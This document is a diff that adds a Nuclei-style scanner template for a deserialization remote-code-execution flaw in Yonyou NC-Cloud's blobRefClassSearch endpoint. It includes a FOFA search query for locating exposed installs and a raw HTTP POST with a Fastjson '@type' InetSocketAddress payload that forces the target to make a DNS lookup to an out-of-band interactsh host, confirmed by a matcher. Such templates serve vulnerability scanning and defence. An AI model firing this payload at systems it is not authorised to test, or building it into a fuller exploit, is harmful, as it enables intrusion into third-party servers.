@@ -1,0 +1,29 @@
+id: yonyou-NC-cloud-blobRefClassSearch-deserialization-rce
+
+info:
+  name: 用友NC-Cloud blobRefClassSearch反序列化rce
+  author: xx
+  severity: high
+  metadata:
+    fofa-query: app="用友-NC-Cloud"
+  tags: yonyou,rce
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /ncchr/pm/ref/indiIssued/blobRefClassSearch HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.4103.116 Safari/537.36
+    Content-Type: application/json
+    Content-Length: 111
+
+    {"clientParam":"{\"x\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"{{interactsh-url}}\"}}}"}
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+      - type: word
+        words:
+          - "dns"
+        part: interactsh_protocol
